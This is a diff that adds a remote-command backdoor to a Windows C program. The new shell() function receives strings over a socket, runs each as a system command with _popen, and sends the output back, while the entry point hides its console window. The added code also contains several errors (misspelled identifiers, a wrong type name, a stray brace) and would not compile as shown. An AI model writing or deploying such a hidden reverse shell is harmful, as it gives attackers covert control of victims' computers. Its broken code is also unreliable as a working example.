@@ -19,6 +19,42 @@
 
 int sock; 
 
+//memset for linux that needs to be defined for windows
+
+#define bzero(p, size)(void) memset((p), 0, (size))
+
+
+//Function to pass commands from shell to function
+void shell() {
+	char buffer[1024];
+	char container[1024];
+	char total_response[18384];
+
+	while (1) {
+              jump:
+	      bzero(buffer,1024);
+              bzero(container, sizeof(container));
+              bzero(total_response, sizeof(total_response));
+	      recv(sock,buffer, 1024, 0);
+	      
+             if (strncmp("q", buffer, 1) ==0){
+                closesocket(sock);		     
+		WSACleanup();
+                exit(0); 
+            }
+	    else {
+		   FILE *fp;
+		   //excutes buffer and adds to total response
+		   fp= _popen(buffer,"r");
+                   while(fgets(container,1024,fp) != NULL){
+			   strcat(total_response, container);
+		   }
+                   send(sock, total_reponse, sizeof(total_response),0);
+		   fclose(fp); 
+	           }
+                   }
+    }
+
 int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LDSTR lpCmdLine, int nCmdShow ){
 //Function to hide CMD window
 	HWND stealth;
@@ -50,6 +86,8 @@ int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LDSTR lpCmdLine, int 
 		Sleep(10);
 	}
 
+	shell();
+      }
         	
 
 
